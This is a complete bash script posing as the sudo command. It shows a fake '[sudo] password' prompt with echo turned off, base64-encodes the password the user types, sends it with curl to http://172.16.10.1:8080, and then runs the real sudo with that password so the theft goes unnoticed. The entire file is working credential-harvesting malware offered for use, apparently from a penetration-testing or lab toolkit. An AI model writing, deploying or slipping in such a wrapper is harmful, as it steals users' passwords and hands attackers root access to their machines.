#!/bin/bash
# shellcheck disable=SC2124
ARGS="$@"

leak_over_http() {
    local encoded_password
    encoded_password=$(echo "${1}" | base64 | sed 's/[=+/]//g')
    curl -m 5 -s -o /dev/null "http://172.16.10.1:8080/${encoded_password}"
}

stty -echo
read -r -p "[sudo] password for $(whoami): " sudopassw
    
leak_over_http "${sudopassw}"
stty echo
# shellcheck disable=SC2086
echo "${sudopassw}" | /usr/bin/sudo -p "" -S -k ${ARGS}
